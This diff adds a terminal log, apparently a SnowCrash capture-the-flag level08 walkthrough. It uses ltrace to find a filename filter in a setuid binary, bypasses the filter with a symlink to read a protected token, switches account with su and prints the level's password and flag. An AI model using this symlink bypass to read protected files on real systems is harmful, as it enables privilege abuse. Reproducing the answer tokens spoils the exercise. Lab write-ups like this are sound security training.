@@ -1,0 +1,33 @@
+level08@SnowCrash:~$ vim /tmp/file
+level08@SnowCrash:~$ ltrace ./level08 /tmp/file
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/file", "token")                                                                            = NULL
+open("/tmp/file", 0, 014435162522)                                                                      = 3
+read(3, "'/home/user/level08/token'\n", 1024)                                                           = 27
+write(1, "'/home/user/level08/token'\n", 27'/home/user/level08/token'
+)                                                            = 27
++++ exited (status 27) +++
+
+level08@SnowCrash:~$ ln -s token /tmp/link
+level08@SnowCrash:~$ ./level08 /tmp/link
+level08: Unable to open /tmp/link: No such file or directory
+level08@SnowCrash:~$ ./level08 /tmp/link
+level08: Unable to open /tmp/link: No such file or directory
+level08@SnowCrash:~$ ltrace ./level08 /tmp/link
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/link", "token")                                                                            = NULL
+open("/tmp/link", 0, 014435162522)                                                                      = -1
+err(1, 0x80487b2, 0xbffff900, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open /tmp/link: No such file or directory
+ <unfinished ...>
++++ exited (status 1) +++
+
+level08@SnowCrash:~$ ln -s ~/token /tmp/link
+level08@SnowCrash:~$ cat /tmp/link
+cat: /tmp/link: Permission denied
+level08@SnowCrash:~$ ./level08 /tmp/link
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password: quif5eloekouj29ke0vouxean
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
